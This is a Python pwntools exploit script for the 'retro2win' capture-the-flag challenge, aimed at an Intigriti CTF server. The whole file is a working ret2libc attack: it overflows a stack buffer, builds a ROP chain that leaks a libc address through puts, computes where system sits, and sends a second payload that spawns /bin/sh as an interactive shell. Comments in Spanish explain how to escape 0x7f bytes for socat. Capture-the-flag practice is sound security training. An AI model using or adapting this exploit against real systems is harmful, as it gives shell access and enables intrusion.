from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./retro2win_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("retro2win.ctf.intigriti.io", 1338)
        #return remote("127.0.0.1", 1339)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 24

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

ret = rop.find_gadget(['ret'])[0]

#print(f"Ret address: {hex(ret)}")

#print(elf.got)

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(elf.got.gets),
    p64(elf.plt.puts),
    p64(elf.sym.main)
])

io.recv()

io.sendline(b"1337")

io.recv()

io.sendline(payload)

io.recvuntil(b"A"*offset)

io.recvline()

leak_gets_libc = u64(io.recvline().strip().ljust(8, b"\x00"))

print(f"Leak Address: {hex(leak_gets_libc)}")

libc.address = leak_gets_libc - libc.sym._IO_gets

print(f"System Address: {hex(libc.sym.system)}")

#rop = ROP(libc)

#pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
#ret = rop.find_gadget(['pop rdi', 'ret'])[0]

print(f'Binsh: {hex(next(libc.search(b"/bin/sh")))}')

# Aqui una gran leccion cuando usas socat xD
# Ojo que cuando haya un \x7f debes anteponer un \x16 ojito UwU

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(next(libc.search(b"/bin/sh"))).replace(b"\x7f", b"\x16\x7f"),
    p64(libc.sym.system).replace(b"\x7f", b"\x16\x7f")
])


io.recv()

io.sendline(b"1337")

#io.recvline()
io.recv()
#input("PAUSE")
#io.sendlineafter("Enter your cheatcode:", payload)

io.sendline(payload)

io.interactive()